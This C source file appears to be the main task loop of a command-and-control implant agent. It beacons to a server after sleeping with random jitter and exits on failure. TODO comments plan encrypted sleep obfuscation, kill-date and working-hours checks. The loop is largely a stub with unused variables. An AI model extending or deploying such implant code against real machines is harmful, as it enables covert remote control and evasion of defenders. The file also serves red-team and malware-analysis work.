#include "TaskController.h"
#include "parser.h"
#include "package.h"

void PerformTask() {

    PARSER   Parser = { 0 };
    DataBuffer   Buffer = { 0 };
    SIZE_T   DataBufferSize = { 0 };
    PARSER   TaskParser = { 0 };
    LPVOID   TaskBuffer = { 0 };
    UINT32   TaskBufferSize = { 0 };
    UINT32   CommandID = { 0 };
    UINT32   RequestID = { 0 };


    while (TRUE) {
        if (!agent->session->Active)
            break;
        
        //TODO implement encrypted sleep obfuscation.
        Sleep((agent->config->SleepTime * 1000) + ((rand() % agent->config->SleepJitter) * 1000));

        //TODO BUILD KILLDATE CHECK

        //TODO BUILD WORKING HOURS CHECK.

        //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
        if (!PackageSendAll(agent, &Buffer, &DataBufferSize))
        {
            exit(-1);
        }
    }

	
}